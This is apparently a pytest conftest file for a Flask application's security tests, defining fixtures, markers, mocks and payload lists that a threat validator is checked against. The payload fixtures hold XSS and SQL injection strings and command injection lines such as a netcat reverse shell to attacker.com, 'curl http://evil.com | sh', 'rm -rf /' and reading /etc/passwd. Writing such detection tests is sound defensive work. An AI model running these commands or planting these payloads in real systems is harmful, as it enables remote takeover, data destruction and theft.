"""
Security Test Configuration and Setup.

This module provides configuration for security tests and ensures
all required dependencies are available.
"""

import pytest
import sys
import os
from unittest.mock import Mock, patch

# Add project root to path
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

# Mock Flask app for testing
@pytest.fixture
def mock_app():
    """Mock Flask application for testing."""
    app = Mock()
    app.config = {
        'SECRET_KEY': 'test-secret-key',
        'TESTING': True,
        'WTF_CSRF_ENABLED': False,
        'CSRF_TOKEN_EXPIRY': 3600,
        'XSS_PROTECTION_ENABLED': True,
        'CONTENT_SECURITY_POLICY_ENABLED': True
    }
    return app

@pytest.fixture
def mock_request():
    """Mock Flask request for testing."""
    request = Mock()
    request.remote_addr = "127.0.0.1"
    request.user_agent.string = "Test Browser/1.0"
    request.url = "/test"
    request.method = "GET"
    request.args = {}
    request.form = {}
    request.headers = {}
    request.json = None
    return request

@pytest.fixture
def mock_session():
    """Mock Flask session for testing."""
    return {}

@pytest.fixture
def mock_g():
    """Mock Flask g object for testing."""
    return Mock()

# Patch Flask imports if not available
try:
    from flask import Flask, request, session, g, current_app
except ImportError:
    # Create mock Flask objects if Flask is not available
    Flask = Mock
    request = Mock()
    session = {}
    g = Mock()
    current_app = Mock()
    
    # Add to sys.modules to prevent import errors
    sys.modules['flask'] = Mock()
    sys.modules['flask.request'] = request
    sys.modules['flask.session'] = session
    sys.modules['flask.g'] = g
    sys.modules['flask.current_app'] = current_app

# Mock other dependencies if not available
try:
    import bleach
except ImportError:
    bleach = Mock()
    sys.modules['bleach'] = bleach

try:
    from markupsafe import Markup
except ImportError:
    Markup = str
    sys.modules['markupsafe'] = Mock()

try:
    import numpy as np
except ImportError:
    np = Mock()
    sys.modules['numpy'] = np

# Test configuration
pytest_plugins = []

def pytest_configure(config):
    """Configure pytest for security tests."""
    # Add custom markers
    config.addinivalue_line(
        "markers", "security: mark test as a security test"
    )
    config.addinivalue_line(
        "markers", "xss: mark test as an XSS protection test"
    )
    config.addinivalue_line(
        "markers", "sqli: mark test as a SQL injection protection test"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as a performance test"
    )
    config.addinivalue_line(
        "markers", "attack_simulation: mark test as an attack simulation"
    )

def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers."""
    for item in items:
        # Add security marker to all tests in security test files
        if "test_security" in item.fspath.basename:
            item.add_marker(pytest.mark.security)
        
        # Add specific markers based on test names
        if "xss" in item.name.lower():
            item.add_marker(pytest.mark.xss)
        elif "sql" in item.name.lower():
            item.add_marker(pytest.mark.sqli)
        elif "performance" in item.name.lower():
            item.add_marker(pytest.mark.performance)
        elif "attack" in item.name.lower():
            item.add_marker(pytest.mark.attack_simulation)

# Test data fixtures
@pytest.fixture
def safe_test_inputs():
    """Safe test inputs for validation."""
    return [
        "Hello World",
        "john.doe@example.com",
        "123-456-7890",
        "This is a normal comment",
        "Property search in Toronto",
        "User feedback about the service"
    ]

@pytest.fixture
def xss_test_payloads():
    """XSS test payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>"
    ]

@pytest.fixture
def sqli_test_payloads():
    """SQL injection test payloads."""
    return [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users --",
        "1; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "'; WAITFOR DELAY '00:00:05' --",
        "1' OR SLEEP(5) --"
    ]

@pytest.fixture
def command_injection_payloads():
    """Command injection test payloads."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "; wget http://evil.com/shell.sh",
        "| nc -e /bin/bash attacker.com 4444",
        "; curl http://evil.com | sh",
        "&& ping -c 10 google.com"
    ]

# Performance test configuration
@pytest.fixture
def performance_config():
    """Configuration for performance tests."""
    return {
        'max_validation_time_ms': 10,
        'max_xss_analysis_time_ms': 15,
        'min_throughput_per_second': 50,
        'max_memory_increase_mb': 50
    }

# Test utilities
def assert_security_detection(validation_result, xss_analysis=None, min_threat_score=3.0):
    """Assert that security threat was detected."""
    from app.security.advanced_validation import ValidationResult
    from app.security.advanced_xss import ThreatLevel
    
    threat_detected = (
        validation_result.result in [
            ValidationResult.SUSPICIOUS,
            ValidationResult.MALICIOUS,
            ValidationResult.BLOCKED
        ] or
        validation_result.threat_score >= min_threat_score
    )
    
    if xss_analysis:
        threat_detected = threat_detected or xss_analysis.threat_level in [
            ThreatLevel.MEDIUM,
            ThreatLevel.HIGH,
            ThreatLevel.CRITICAL
        ]
    
    assert threat_detected, f"Security threat not detected. Score: {validation_result.threat_score}"

def assert_safe_input(validation_result, max_threat_score=3.0):
    """Assert that input is considered safe."""
    from app.security.advanced_validation import ValidationResult
    
    assert validation_result.result == ValidationResult.SAFE, f"Safe input flagged as unsafe: {validation_result.result}"
    assert validation_result.threat_score <= max_threat_score, f"Safe input has high threat score: {validation_result.threat_score}"

# Mock security modules if not available
try:
    from app.security.advanced_validation import AdvancedInputValidator
except ImportError:
    # Create mock if module not available for testing
    class MockValidator:
        def validate_input(self, *args, **kwargs):
            from unittest.mock import Mock
            result = Mock()
            result.result = Mock()
            result.result.value = 'safe'
            result.threat_score = 0.0
            result.patterns_detected = []
            result.confidence = 1.0
            return result
    
    AdvancedInputValidator = MockValidator

# Setup logging for tests
import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Test environment validation
def validate_test_environment():
    """Validate that the test environment is properly configured."""
    issues = []
    
    # Check Python version
    if sys.version_info < (3, 7):
        issues.append("Python 3.7+ required")
    
    # Check for pytest
    try:
        import pytest
    except ImportError:
        issues.append("pytest not installed")
    
    # Check for required test dependencies
    optional_deps = ['coverage', 'pytest-cov', 'pytest-json-report']
    missing_deps = []
    
    for dep in optional_deps:
        try:
            __import__(dep.replace('-', '_'))
        except ImportError:
            missing_deps.append(dep)
    
    if missing_deps:
        issues.append(f"Optional test dependencies missing: {', '.join(missing_deps)}")
    
    if issues:
        logger.warning("Test environment issues found:")
        for issue in issues:
            logger.warning(f"  - {issue}")
    else:
        logger.info("Test environment validation passed")
    
    return len(issues) == 0

# Run validation when module is imported
if __name__ != '__main__':
    validate_test_environment()
